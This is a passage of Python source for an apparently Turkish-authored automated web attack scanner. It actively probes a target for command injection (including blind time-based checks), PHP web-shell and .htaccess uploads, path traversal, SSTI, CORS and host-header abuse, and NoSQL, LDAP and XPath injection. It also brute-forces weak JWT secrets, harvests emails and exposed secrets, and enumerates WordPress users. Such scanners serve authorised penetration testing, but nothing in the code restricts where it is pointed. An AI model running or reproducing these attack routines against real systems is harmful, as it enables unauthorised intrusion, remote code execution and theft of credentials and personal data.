            is_post = "post" in f.lower()
            if not has_token and is_post:
                with self.lock:
                    self.results["csrf_tests"].append({"url": url, "method": "POST", "status": "TOKEN YOK"})
                    self.results["vulns"].append({"url": url, "type": "CSRF (POST token yok)"})
                self.log(f"CSRF: {url}", "warning")
                return

    # ---------- JWT ----------
    def _test_jwt(self, url, r):
        tokens = []
        if r.text:
            tokens += re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', r.text)
        for ck in r.headers.get("Set-Cookie", "").split(","):
            tokens += re.findall(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+', ck)
        for token in set(tokens):
            parts = token.split(".")
            if len(parts) != 3: continue
            try:
                pad = parts[0] + "=" * (-len(parts[0]) % 4)
                header = json.loads(base64.urlsafe_b64decode(pad).decode(errors="ignore"))
                alg = header.get("alg","")
                with self.lock: self.results["jwt_tests"].append({"url": url, "alg": alg})
                if alg.lower() == "none":
                    with self.lock:
                        self.results["vulns"].append({"url": url, "type": "JWT alg=none"})
                    self.log(f"JWT none: {url}", "critical")
                if alg.startswith("HS"):
                    for sec in JWT_WEAK_SECRETS:
                        try:
                            sig = hmac.new(sec.encode(), f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
                            b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
                            if b64 == parts[2]:
                                with self.lock:
                                    self.results["vulns"].append({"url": url, "type": f"JWT weak secret: {sec}"})
                                self.log(f"JWT weak: {sec}", "critical")
                                self.notifier.send(f"[JWT weak] {sec}")
                                break
                        except Exception: continue
            except Exception: continue

    # ---------- CORS ----------
    def _test_cors(self, url, r):
        if "Access-Control-Allow-Origin" not in r.headers: return
        origin = r.headers.get("Access-Control-Allow-Origin","")
        with self.lock: self.results["cors_tests"].append({"url": url, "origin": origin})
        if origin == "*":
            with self.lock:
                self.results["vulns"].append({"url": url, "type": "CORS wildcard (*)"})
            self.log(f"CORS *: {url}", "warning")
        evil = "https://evil-attacker.example"
        rr = self._request("OPTIONS", url, timeout=5, category="attack", headers={
            "Origin": evil, "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "authorization"})
        if rr and rr.headers.get("Access-Control-Allow-Origin") == evil:
            with self.lock:
                self.results["vulns"].append({"url": url, "type": "CORS origin reflect+preflight"})
            self.log(f"CORS reflect: {url}", "critical")
        rn = self._request("OPTIONS", url, timeout=5, category="attack", headers={
            "Origin": "null", "Access-Control-Request-Method": "GET"})
        if rn and rn.headers.get("Access-Control-Allow-Origin") == "null":
            with self.lock:
                self.results["vulns"].append({"url": url, "type": "CORS null origin"})
            self.log(f"CORS null: {url}", "critical")

    # ---------- HOST HEADER ----------
    def _test_host_header(self, url):
        for hname in ("X-Forwarded-Host","X-Host","X-Forwarded-Server","X-Original-URL"):
            try:
                rr = self.get(url, headers={hname: "evil-attacker.example"}, timeout=5, category="attack")
                if rr and "evil-attacker.example" in rr.text:
                    with self.lock:
                        self.results["host_header_tests"].append({"url": url, "header": hname, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": url, "type": f"Host Header ({hname})"})
                    self.log(f"HostHeader: {hname} @ {url}", "critical")
                    return
            except Exception: continue

    # ---------- PATH TRAVERSAL ----------
    def _test_path_traversal(self, url, params):
        if not params: return
        base_url = url.split("?")[0]; bl = self._get_baseline(base_url)
        for p in params[:2]:
            for payload, marker in PATH_TRAV:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                r = self.get(test_url, timeout=6, category="attack")
                if r and marker in r.text and marker not in bl:
                    with self.lock:
                        self.results["path_traversal_tests"].append({"url": test_url, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": test_url, "type": f"Path Traversal ({p})"})
                    self.log(f"LFI: {p}", "critical")
                    self.notifier.send(f"[LFI] {test_url}")
                    return

    # ---------- CMDI (2 confirm time-based) ----------
    def _test_command_injection(self, url, params):
        if not params: return
        base_url = url.split("?")[0]; bl = self._get_baseline(base_url)
        for p in params[:2]:
            # Direct output
            for payload, marker in CMDI_PAYLOADS:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                r = self.get(test_url, timeout=8, category="attack")
                if r and marker in r.text and marker not in bl:
                    with self.lock:
                        self.results["command_injection_tests"].append({"url": test_url, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": test_url, "type": "Command Injection"})
                    self.log(f"RCE: {p}", "critical")
                    self.notifier.send(f"[RCE] {test_url}")
                    return
            # Time-based (2 confirm)
            for payload in CMDI_TIME_PAYLOADS:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                t0 = time.time()
                self.get(test_url, timeout=min(15, self.task_timeout), category="attack")
                el = time.time() - t0
                if el > 4:
                    t1 = time.time()
                    self.get(test_url, timeout=min(15, self.task_timeout), category="attack")
                    el2 = time.time() - t1
                    if el2 > 4:
                        with self.lock:
                            self.results["command_injection_tests"].append({"url": test_url, "status": "TIME-CONFIRMED"})
                            self.results["vulns"].append({"url": test_url, "type": "Command Injection (blind time)"})
                        self.log(f"RCE blind CONFIRMED: {p} {el:.1f}s/{el2:.1f}s", "critical")
                        self.notifier.send(f"[RCE blind] {test_url}")
                        return

    # ---------- FILE UPLOAD ----------
    def _test_file_upload(self, url, d):
        if not ("upload" in d.lower() or "file" in d.lower()): return
        marker = f"pwned_{random.randint(10000,99999)}"
        payloads = [
            ("x.php", f'<?php echo "{marker}"; ?>', "application/x-php"),
            ("x.phtml", f'<?php echo "{marker}"; ?>', "application/x-php"),
            ("x.php5", f'<?php echo "{marker}"; ?>', "application/x-php"),
            ("x.php.jpg", f'<?php echo "{marker}"; ?>', "image/jpeg"),
            ("x.jpg.php", f'<?php echo "{marker}"; ?>', "image/jpeg"),
        ]
        fields = ["file","upload","image","avatar","attachment","upload_file",
                  "userfile","document","media","photo"]
        for field in fields:
            for fname, content, ctype in payloads:
                try:
                    files = {field: (fname, content, ctype)}
                    rr = self.post(url, files=files, timeout=10, category="attack")
                    if not rr: continue
                    m = re.search(r'((?:https?://[^\s"\']+)|(?:/[^\s"\']+))\.(?:php|phtml|php5)', rr.text)
                    if m:
                        full = m.group(0)
                        if not full.startswith("http"):
                            full = f"https://{self.target}{full}"
                        check = self.get(full, timeout=6, category="attack")
                        if check and marker in check.text:
                            with self.lock:
                                self.results["file_upload_tests"].append({"url": url, "shell": full, "status": "BULUNDU"})
                                self.results["vulns"].append({"url": url, "type": f"Upload RCE ({fname})"})
                            self.log(f"Upload RCE: {full}", "critical")
                            self.notifier.send(f"[Upload RCE] {full}")
                            return
                except Exception: continue
        # .htaccess upload denemesi
        try:
            files = {"file": (".htaccess", "AddType application/x-httpd-php .jpg", "text/plain")}
            rr = self.post(url, files=files, timeout=10, category="attack")
            if rr and rr.status_code in (200,201):
                with self.lock:
                    self.results["file_upload_tests"].append({"url": url, "type": "htaccess upload", "status": "POSSIBLE"})
                self.log(f"Possible .htaccess upload: {url}", "warning")
        except Exception: pass

    # ---------- SSTI ----------
    def _test_ssti(self, url, params):
        if not params: return
        base_url = url.split("?")[0]; bl = self._get_baseline(base_url)
        for p in params[:2]:
            for payload, expected in SSTI_PAYLOADS:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                r = self.get(test_url, timeout=6, category="attack")
                if r and expected in r.text and expected not in bl:
                    with self.lock:
                        self.results["ssti_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": test_url, "type": "SSTI"})
                    self.log(f"SSTI: {p} {payload}", "critical")
                    self.notifier.send(f"[SSTI] {test_url}")
                    return

    # ---------- CRLF ----------
    def _test_crlf(self, url, params):
        if not params: return
        base_url = url.split("?")[0]
        for p in params[:2]:
            test_url = f"{base_url}?{p}=test%0d%0aX-Injected-CRLF:1"
            try:
                rr = self.get(test_url, timeout=5, category="attack")
                if rr and "x-injected-crlf" in str(rr.headers).lower():
                    with self.lock:
                        self.results["crlf_tests"].append({"url": test_url, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": test_url, "type": "CRLF Injection"})
                    self.log(f"CRLF: {p}", "critical")
                    return
            except Exception: continue

    # ---------- OPEN REDIRECT (chain follow + cap) ----------
    def _test_open_redirect(self, url, params):
        base_url = url.split("?")[0]
        candidates = list(set(params) | {"next","url","redirect","return","continue"})[:6]
        for p in candidates:
            test_url = f"{base_url}?{p}=https://evil-redirect.example"
            chain = self._follow_redirects(test_url, max_hops=3)
            if chain and any("evil-redirect.example" in c for c in chain):
                with self.lock:
                    self.results["open_redirect_tests"].append({"url": test_url, "chain": chain, "status": "BULUNDU"})
                    self.results["vulns"].append({"url": test_url, "type": "Open Redirect"})
                self.log(f"Open Redirect: {p}", "critical")
                return

    def _follow_redirects(self, url, max_hops=3):
        chain = []
        cur = url
        for _ in range(max_hops):
            r = self._request("GET", cur, timeout=5, category="attack", allow_redirects=False)
            if not r: break
            loc = r.headers.get("Location","")
            if not loc: break
            chain.append(loc)
            if not loc.startswith("http"): loc = urljoin(cur, loc)
            cur = loc
        return chain

    # ---------- NoSQL ----------
    def _test_nosql(self, url, r):
        ctype = (r.headers.get("Content-Type") or "").lower()
        if "json" not in ctype and "api" not in url.lower(): return
        for good, bad in NOSQL_PAYLOADS:
            try:
                rg = self.post(url, data=good, headers={"Content-Type":"application/json"}, timeout=8, category="attack")
                rb = self.post(url, data=bad,  headers={"Content-Type":"application/json"}, timeout=8, category="attack")
                if rg and rb and rg.status_code == 200 and rb.status_code != 200:
                    with self.lock:
                        self.results["nosql_tests"].append({"url": url, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": url, "type": "NoSQL Injection"})
                    self.log(f"NoSQL: {url}", "critical")
                    return
            except Exception: continue

    # ---------- LDAP (error sigs) ----------
    def _test_ldap(self, url, params):
        if not params: return
        base_url = url.split("?")[0]; bl = self._get_baseline(base_url)
        for p in params[:2]:
            for payload in LDAP_PAYLOADS:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                r = self.get(test_url, timeout=6, category="attack")
                if not r: continue
                for sig in LDAP_ERROR_SIGS:
                    if re.search(sig, r.text, re.I) and not re.search(sig, bl, re.I):
                        with self.lock:
                            self.results["ldap_tests"].append({"url": test_url, "status": "BULUNDU"})
                            self.results["vulns"].append({"url": test_url, "type": "LDAP Injection"})
                        self.log(f"LDAP: {p}", "critical")
                        return

    # ---------- XPath ----------
    def _test_xpath(self, url, params):
        if not params: return
        base_url = url.split("?")[0]; bl = self._get_baseline(base_url)
        for p in params[:2]:
            for payload in XPATH_PAYLOADS:
                test_url = f"{base_url}?{p}={quote(payload, safe='')}"
                r = self.get(test_url, timeout=6, category="attack")
                if r and ("XPath" in r.text or "XPATH" in r.text) and "XPath" not in bl:
                    with self.lock:
                        self.results["xpath_tests"].append({"url": test_url, "status": "BULUNDU"})
                        self.results["vulns"].append({"url": test_url, "type": "XPath Injection"})
                    self.log(f"XPath: {p}", "critical")
                    return

    # ---------- PROTO ----------
    def _test_proto_pollution(self, url):
        if not url.endswith(("/merge","/clone","/update","/parse")): return
        payload = '{"__proto__":{"polluted":"yes"}}'
        try:
            rr = self.post(url, data=payload, headers={"Content-Type":"application/json"}, timeout=6, category="attack")
            if rr and "polluted" in rr.text:
                with self.lock:
                    self.results["proto_pollution"].append({"url": url, "status": "BULUNDU"})
                    self.results["vulns"].append({"url": url, "type": "Prototype Pollution"})
                self.log(f"ProtoPollution: {url}", "critical")
        except Exception: pass

    # ---------- DESERIALIZATION ----------
    def _test_deserialization(self, url, r):
        text = r.text or ""
        ctype = (r.headers.get("Content-Type") or "").lower()
        for name, (sigs, ctx_hints) in DESERIALIZATION_SIGS.items():
            for s in sigs:
                if s in text and any(h in ctype for h in ctx_hints):
                    with self.lock:
                        self.results["deserialization_hits"].append({"url": url, "type": name})
                    self.log(f"Deser {name} @ {url}", "warning")
                    return

    # ---------- CACHE ----------
    def _test_cache_poison(self, url):
        try:
            rr = self.get(url, headers={"X-Forwarded-Host": "evil-cache.example"}, timeout=5, category="attack")
            if rr and ("evil-cache.example" in rr.text or "evil-cache.example" in str(rr.headers)):
                with self.lock:
                    self.results["cache_poison"].append({"url": url, "status": "BULUNDU"})
                    self.results["vulns"].append({"url": url, "type": "Cache Poisoning"})
                self.log(f"CachePoison: {url}", "critical")
        except Exception: pass

    # ---------- GRAPHQL ----------
    def _test_graphql(self, url):
        q = '{"query":"{__schema{types{name}}}"}'
        try:
            rr = self.post(url, data=q, headers={"Content-Type":"application/json"}, timeout=6, category="attack")
            if rr and "__schema" in rr.text:
                with self.lock:
                    self.results["graphql_tests"].append({"url": url, "status": "INTROSPECTION"})
                    self.results["vulns"].append({"url": url, "type": "GraphQL introspection"})
                self.log(f"GraphQL: {url}", "found")
                return
        except Exception: pass
        q2 = '{"query":"{ __typnam }"}'
        try:
            rr = self.post(url, data=q2, headers={"Content-Type":"application/json"}, timeout=6, category="attack")
            if rr and "did you mean" in rr.text.lower():
                with self.lock:
                    self.results["graphql_tests"].append({"url": url, "status": "FIELD-SUGGESTION"})
                    self.results["vulns"].append({"url": url, "type": "GraphQL field suggestion"})
                self.log(f"GraphQL suggestion: {url}", "found")
        except Exception: pass

    # ---------- YARDIMCI ----------
    def _harvest_emails(self, url, text):
        if not text or len(text) > 800000: return
        for e in set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)):
            if e.endswith((".png",".jpg",".gif",".css",".js",".svg",".webp")): continue
            if len(e) > 80: continue
            with self.lock:
                if e not in self.results["emails"]:
                    self.results["emails"].append(e)
                    self.log(f"Email: {e}", "found")

    def _scan_sensitive(self, url, text):
        if not text or len(text) > 800000: return
        for name, pat in SENSITIVE_PATTERNS.items():
            try:
                m = re.search(pat, text)
                if m:
                    val = m.group(0)[:60]
                    if val in self._sensitive_seen: continue
                    self._sensitive_seen.add(val)
                    with self.lock:
                        self.results["sensitive_data"].append({"url": url, "type": name, "val": val})
                        self.results["vulns"].append({"url": url, "type": f"Sensitive {name}"})
                    self.log(f"Sensitive {name}: {val[:40]}", "critical")
                    self.notifier.send(f"[Sensitive] {name} @ {url}")
            except Exception: continue

    def _check_dir_listing(self, url, text):
        if not text: return
        for sig in ("<title>Index of /","Directory listing for","[To Parent Directory]","<h1>Index of"):
            if sig in text:
                with self.lock:
                    self.results["vulns"].append({"url": url, "type": "Directory Listing"})
                self.log(f"Dir listing: {url}", "warning")
                return

    def _extract_comments(self, url, text):
        if not text: return
        for c in re.findall(r'<!--(.*?)-->', text, re.DOTALL)[:30]:
            c = c.strip()
            if len(c) < 8 or len(c) > 400: continue
            if re.search(r'(?i)(todo|fixme|hack|password|secret|api[_-]?key|admin|debug)', c):
                with self.lock:
                    self.results["interesting_files"].append({"url": url, "comment": c[:120]})
                self.log(f"Yorum: {c[:70]}", "found")

    # ==================== WORDPRESS ====================
    def scan_wordpress(self):
        self.log("WordPress", "info")
        r = self._safe_run(lambda: self.get(f"https://{self.target}/wp-json", timeout=8))
        if not r or r.status_code != 200:
            self.progress(); return
        with self.lock:
            self.results["tech"].append("WordPress"); self.results["cms"] = "WordPress"
        self.log("WordPress tespit", "found")
        try:
            m = re.search(r'"version":"([\d.]+)"', r.text)
            if m:
                with self.lock: self.results["wp_version"] = m.group(1)
                self.log(f"WP v{m.group(1)}", "found")
        except Exception: pass
        ur = self.get(f"https://{self.target}/wp-json/wp/v2/users", timeout=8)
        if ur and ur.status_code == 200:
            try:
                for u in ur.json():
                    if isinstance(u, dict) and "slug" in u:
                        with self.lock: self.results["wp_users"].append(u["slug"])
                        self.log(f"WP user: {u['slug']}", "found")
            except Exception: pass
        self.progress()

    # ==================== BACKUPS ====================
    def scan_backups(self):
        self.log(f"Backup tarama: {len(BACKUP_NAMES)}x{len(BACKUP_EXTS)}", "info")
        def worker(name):
            for ext in BACKUP_EXTS:
                u = f"https://{self.target}/{name}{ext}"
                rr = self._request("HEAD", u, timeout=min(4, self.task_timeout), retries=0)
                if rr and rr.status_code == 200:
                    cl = rr.headers.get("Content-Length")
                    if cl is None or int(cl or 0) > 0:
                        return u
            return None
        with ThreadPoolExecutor(max_workers=min(10, self.workers)) as ex:
            futs = [ex.submit(worker, n) for n in BACKUP_NAMES]
            for f in as_completed(futs):
                try: res = f.result(timeout=1)
                except Exception: res = None
                if res:
                    with self.lock:
                        self.results["backup_files"].append(res)
                        self.results["vulns"].append({"url": res, "type": "Backup exposed"})
                    self.log(f"BACKUP: {res}", "critical")
                    self.notifier.send(f"[Backup] {res}")
                self.progress()

    # ==================== HTTP METHODS ====================
    def scan_http_methods(self):
        self.log("HTTP Methods", "info")
        url = f"https://{self.target}/"
        rr = self._request("OPTIONS", url, timeout=6)
        if rr:
            allow = rr.headers.get("Allow","")
            if allow:
                self.log(f"Allow: {allow}", "found")
                danger = [m for m in ("PUT","DELETE","TRACE","CONNECT","PATCH") if m in allow.upper()]
                if danger:
                    with self.lock:
                        self.results["vulns"].append({"url": url, "type": f"Dangerous methods: {','.join(danger)}"})
                    self.log(f"Tehlikeli method: {danger}", "warning")
        tr = self._request("TRACE", url, timeout=6)
        if tr and tr.status_code == 200 and "TRACE" in tr.text.upper():
            with self.lock:
                self.results["vulns"].append({"url": url, "type": "TRACE enabled (XST)"})
            self.log("TRACE aktif", "warning")
        self.progress()

    # ==================== COOKIES ====================
    def scan_cookies(self):
        self.log("Cookie analiz", "info")
        r = self.get(f"https://{self.target}/", timeout=6)
        if not r: self.progress(); return
        for c in r.cookies:
            issues = []
            if not c.secure: issues.append("Secure yok")
            rest = str(getattr(c, "_rest", {})).lower()
            if "httponly" not in rest: issues.append("HttpOnly yok")
            if "samesite" not in rest: issues.append("SameSite yok")
            with self.lock: self.results["cookies"].append({"name": c.name, "issues": issues})
            if issues:
                with self.lock:
                    self.results["vulns"].append({"url": str(r.url), "type": f"Cookie {c.name}: {', '.join(issues)}"})
                self.log(f"Cookie {c.name}: {', '.join(issues)}", "warning")
        self.progress()

    # ==================== CSP ====================
    def scan_csp(self):
        self.log("CSP", "info")
        r = self.get(f"https://{self.target}/", timeout=6)
        if not r: self.progress(); return
        csp = r.headers.get("Content-Security-Policy","")
        if not csp:
            self.log("CSP yok", "warning"); self.progress(); return
        weak = []
        if "unsafe-inline" in csp: weak.append("unsafe-inline")
        if "unsafe-eval" in csp: weak.append("unsafe-eval")
        if "data:" in csp: weak.append("data:")
        if re.search(r'default-src[^;]*\*', csp): weak.append("wildcard default-src")
        with self.lock: self.results["csp"] = {"raw": csp[:500], "weak": weak}
        if weak:
            with self.lock:
                self.results["vulns"].append({"url": f"https://{self.target}/", "type": f"Zayıf CSP: {','.join(weak)}"})
            self.log(f"Zayıf CSP: {weak}", "warning")
        else: self.log("CSP güçlü", "success")
        self.progress()

    # ==================== ROBOTS + SITEMAP ====================
    def scan_robots_sitemap(self):
        self.log("robots.txt + sitemap", "info")
        extra_dirs = []
        try:
            r = self.get(f"https://{self.target}/robots.txt", timeout=6)
            if r and r.status_code == 200:
                for line in r.text.splitlines():
                    if line.lower().startswith(("disallow:","allow:")):
                        p = line.split(":",1)[1].strip()
                        if p and p != "/" and p.startswith("/") and "?" not in p and len(p) < 100:
                            clean = p.rstrip("*").rstrip("/") or "/"
                            if clean != "/": extra_dirs.append(clean)
                with self.lock:
                    self.results["interesting_files"].append({"robots": extra_dirs[:30]})
                self.log(f"robots.txt: {len(extra_dirs)} path", "found")
        except Exception: pass
        try:
            r = self.get(f"https://{self.target}/sitemap.xml", timeout=6)
            if r and r.status_code == 200:
                urls = re.findall(r'<loc>([^<]+)</loc>', r.text)
                with self.lock: self.results["wayback_urls"].extend(urls[:100])
                for u in urls[:50]:
                    try:
                        p = urlparse(u).path
                        if p and p != "/" and "?" not in p and len(p) < 100:
                            clean = p.rstrip("/") or "/"
                            if clean != "/": extra_dirs.append(clean)
                    except Exception: pass
                self.log(f"sitemap: {len(urls)} URL", "found")
        except Exception: pass
        if extra_dirs:
            with self.lock:
                before = len(self.dirs)
                self.dirs = list(set(self.dirs + extra_dirs))
                added = len(self.dirs) - before
            if added > 0: self.log(f"+{added} yeni dir", "found")
        self.progress()

    # ==================== SOFT-404 ====================
    def detect_soft404(self):
        self.log("Soft-404", "info")
        rnd = f"/{random.randint(100000,999999)}-{random.randint(100000,999999)}"
        r = self.get(f"https://{self.target}{rnd}", timeout=6)
        if r and r.status_code == 200 and len(r.text) > 200:
            with self.lock:
                self.results["soft404"] = {"url": f"https://{self.target}{rnd}", "len": len(r.text)}
                self.results["vulns"].append({"url": f"https://{self.target}{rnd}", "type": f"Soft-404 ({len(r.text)}B)"})
            self.log(f"Soft-404: {len(r.text)} byte", "warning")
        self.progress()

    # ==================== FAVICON ====================
    def scan_favicon(self):
        self.log("Favicon", "info")
        r = self.get(f"https://{self.target}/favicon.ico", timeout=6)
        if r and r.status_code == 200 and len(r.content) > 0:
            md5 = hashlib.md5(r.content).hexdigest()
            with self.lock: self.results["favicon_md5"] = md5
            self.log(f"Favicon MD5: {md5}", "found")
        self.progress()

    # ==================== RATE LIMIT (limiter bypass) ====================
    def test_rate_limit(self):
        self.log("Rate limit test (burst)", "info")
        url = f"https://{self.target}/"
        sess = self.pool.get()
        got_429 = False
        sent = 0
        for i in range(40):
            try:
                r = sess.get(url, timeout=3, verify=False, allow_redirects=False,
                             headers={"User-Agent": random.choice(UA_POOL)})
                sent += 1
                if r.status_code == 429:
                    got_429 = True
                    self.log(f"Rate limit VAR ({sent}. istek)", "success")
                    break
            except Exception: break
            time.sleep(0.03)
        if not got_429:
            with self.lock:
                self.results["vulns"].append({"url": url, "type": f"Rate limit yok ({sent} burst)"})
            self.log(f"Rate limit YOK ({sent} istek)", "warning")
        self.progress()

    # ==================== HTTP/2 ====================
    def check_http2(self):
        self.log("HTTP/2", "info")
        r = self.get(f"https://{self.target}/", timeout=6)
        if r:
            if "Alt-Svc" in r.headers:
                self.log(f"Alt-Svc: {r.headers['Alt-Svc'][:80]}", "info")
            if hasattr(r.raw, "version"):
                v = r.raw.version
                with self.lock: self.results["http2"] = {"version": v}
                if v == 20: self.log("HTTP/2 aktif", "success")
                elif v == 11: self.log("HTTP/1.1", "info")
        self.progress()

    # ==================== HSTS ====================
    def scan_hsts(self):
        self.log("HSTS", "info")
        r = self.get(f"https://{self.target}/", timeout=6)
        if not r: self.progress(); return
        hsts = r.headers.get("Strict-Transport-Security","")
        if not hsts: self.progress(); return
        info = {"raw": hsts}
        m = re.search(r'max-age=(\d+)', hsts)
        if m:
            age = int(m.group(1)); info["max_age"] = age
            if age < 31536000:
                with self.lock:
                    self.results["vulns"].append({"url": f"https://{self.target}/", "type": f"HSTS max-age kısa ({age}s)"})
                self.log(f"HSTS kısa: {age}", "warning")
        info["includeSubDomains"] = "includeSubDomains" in hsts
        info["preload"] = "preload" in hsts
        with self.lock: self.results["hsts"] = info
        self.progress()

    # ==================== API VERSIONS ====================
    def scan_api_versions(self):
        self.log("API version enum", "info")
        versions = ["v1","v2","v3","v4","v5","beta","internal","private","1","2","latest","stable"]
        def worker(v):
            for base in ("/api/","/rest/"):
                u = f"https://{self.target}{base}{v}/"
                rr = self._request("GET", u, timeout=min(4, self.task_timeout), retries=0)
                if rr and rr.status_code in (200,401,403): return (u, rr.status_code)
            return None
        with ThreadPoolExecutor(max_workers=min(8, self.workers)) as ex:
            for res in ex.map(worker, versions):
                if res:
                    with self.lock:
                        self.results["api_endpoints"].append({"path": res[0], "status": res[1]})
                    self.log(f"API: {res[0]} -> {res[1]}", "found")
                self.progress()

    # ==================== SWAGGER ====================
    def scan_swagger(self):
        self.log("Swagger/OpenAPI", "info")
        paths = ["/swagger.json","/openapi.json","/api-docs","/v2/api-docs","/v3/api-docs",
                 "/swagger-ui.html","/docs","/redoc","/api/swagger.json"]
        for p in paths:
            u = f"https://{self.target}{p}"
            r = self.get(u, timeout=6)
            if r and r.status_code == 200 and any(k in r.text for k in ("swagger","openapi","paths")):
                with self.lock:
                    self.results["swagger"].append({"url": u})
                    self.results["vulns"].append({"url": u, "type": "Swagger/OpenAPI exposed"})
                self.log(f"Swagger: {u}", "found")
        self.progress()

    # ==================== RACE ====================
    def test_race(self):
        self.log("Race (30 paralel)", "info")
        proto = "https" if self.results.get("ssl",{}).get("active") else "http"
        url = f"{proto}://{self.target}/"
        try:
            with ThreadPoolExecutor(max_workers=15) as ex:
                list(ex.map(lambda _: self.get(url, timeout=6), range(30)))
            with self.lock:
                self.results["race_tests"].append({"url": url, "count": 30, "status": "SENT"})
            self.log("Race: 30 paralel istek", "info")
        except Exception as e: self.log(f"Race: {e}", "error")
        self.progress()

    # ==================== CMS ====================
    def scan_cms(self):
        self.log("CMS fingerprint", "info")
        r = self.get(f"https://{self.target}/", timeout=6)
        if not r: self.progress(); return
        text = (r.text or "").lower(); hdrs = str(r.headers).lower()
        for cms, sigs in CMS_FINGERPRINTS.items():
            hits = [s for s in sigs if s.lower() in text or s.lower() in hdrs]
            if hits:
                with self.lock:
                    self.results["cms_hits"].append({"cms": cms, "hits": hits})
                self.log(f"CMS: {cms} ({len(hits)} hit)", "found")
        self.progress()

    # ==================== ÖZET ====================
    def summary(self):
        elapsed = int(time.time() - self.start)
        L = self.logger
        L.raw("\n" + "=" * 80)
        L.raw(f" ÖZET | Hedef: {self.target} | Süre: {elapsed}s")
        L.raw(f" Mod: PORTS={PORTS_MODE} ({len(self.ports)}) | SUBS={SUBS_MODE} ({len(self.subdomains)})")
        L.raw("=" * 80)
        L.raw(f"Portlar:    {len(self.results['ports'])} -> {self.results['ports'][:80]}")
        L.raw(f"Dizinler:   {len(self.results['dirs'])}")
        L.raw(f"Subdomain:  {len(self.results['subdomains'])}")
        L.raw(f"Parametre:  {len(self.results['parameters'])} -> {self.results['parameters'][:30]}")
        L.raw(f"Email:      {len(self.results['emails'])}")
        L.raw(f"Backup:     {len(self.results['backup_files'])}")
        L.raw(f"CMS:        {self.results['cms']} | {self.results['cms_hits']}")
        L.raw(f"WAF:        {self.results['waf']} | Cloud: {self.results['cloud']}")
        L.raw(f"ZeroDay:    {len(self.results['zeroday_findings'])}")
        for zd in self.results["zeroday_findings"]:
            L.raw(f"  [ZD] {zd['type']} @ {zd['url']}")
        L.raw(f"Retry:      {self.results['retry_events']} | Skip: {self.results['skipped']} | WAF-block: {self.results['blocked_by_waf']}")
        if self.results["errors"]:
            L.raw(f"HATALAR: {len(self.results['errors'])}")
            for e in self.results["errors"][:20]: L.raw(f"  - {e}")
        L.raw("-" * 80)
        L.raw(f"VULN TOPLAM: {len(self.results['vulns'])}")
        for v in self.results["vulns"]:
            L.raw(f"  [!] {v['type']} -> {v['url']}")
        L.raw("=" * 80)

        print(f"\n{BOLD}{C}=== ÖZET ==={N}")
        print(f"{Y}Süre:{N} {elapsed}s | {Y}Vuln:{N} {len(self.results['vulns'])} "
              f"| {Y}Port:{N} {len(self.results['ports'])}/{len(self.ports)} "
              f"| {Y}Sub:{N} {len(self.results['subdomains'])}/{len(self.subdomains)} "
              f"| {Y}Dir:{N} {len(self.results['dirs'])} "
              f"| {Y}ZeroDay:{N} {len(self.results['zeroday_findings'])}")
        print(f"{G}Log: {self.logfile}{N}")
        if self.results["zeroday_findings"]:
            print(f"\n{M}{BOLD}ZERO-DAY BULGULARI:{N}")
            for zd in self.results["zeroday_findings"][:15]:
                print(f"  {M}[ZD]{N} {zd['type'][:80]}")
        if self.results["vulns"]:
            print(f"\n{R}{BOLD}BULUNAN AÇIKLAR:{N}")
            for v in self.results["vulns"][:40]:
                print(f"  {R}[!]{N} {v['type']} -> {v['url'][:70]}")

    def save(self):
        fname = f"result_{self.target}_{int(time.time())}.json"
        tmp = fname + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2, default=str, ensure_ascii=False)
        os.replace(tmp, fname)
        self.logger.log(f"JSON: {fname}", "success")

    # ==================== RUN ====================
    def run(self):
        print(f"{BOLD}{M} ProMax Scanner v7.0 ULTRA+ {N}")
        print(f"{B}Hedef: {self.target} | Log: {self.logfile}{N}")
        print(f"{B}Threads: {self.workers} | Timeout: {self.task_timeout}s{N}")
        print(f"{B}Ports: {PORTS_MODE} ({len(self.ports)}) | Subs: {SUBS_MODE} ({len(self.subdomains)}){N}\n")

        steps = [
            self.scan_ports, self.check_ssl, self.check_headers,
            self.scan_dns, self.scan_crtsh, self.scan_cms,
            self.scan_wordpress, self.scan_backups, self.scan_http_methods,
            self.scan_cookies, self.scan_csp, self.scan_robots_sitemap,
            self.detect_soft404, self.scan_favicon, self.test_rate_limit,
            self.check_http2, self.scan_hsts, self.scan_api_versions,
            self.scan_swagger, self.test_race, self.scan_zone_transfer,
            self.scan_wayback, self.scan_dirs, self.scan_subdomains,
        ]
        for step in steps:
            try: step()
            except Exception as e:
                self.logger.log(f"[{step.__name__}] HATA: {e}", "error")
                with self.lock:
                    if len(self.results["errors"]) < self._error_cap:
                        self.results["errors"].append(f"{step.__name__}: {e}")
                print(f"{R}[-] {step.__name__}: {e}{N}")
        try: self.run_pending_tests()
        except Exception as e:
            self.logger.log(f"Test fazı hata: {e}", "error")
        self.done = self.total
        self.progress(0)
        self.summary()
        try:
            if input(f"\n{B}JSON kaydet? (E/H): {N}").strip().upper() == "E":
                self.save()
        except EOFError: pass

# ============================================================
def main():
    print(f"{BOLD}╔══════════════════════════════════════════════════╗")
    print(f"║ {C} ProMax Scanner v7.0 ULTRA+ {BOLD}                     ║")
    print(f"║ {Y}ZERO-DAY Finder | 3 port mode | 3 sub mode{BOLD}      ║")
    print(f"║ {M}Quick/Extended/Full | Proxy | Cookie | WAF{BOLD}     ║")
    print("╚══════════════════════════════════════════════════╝\n")
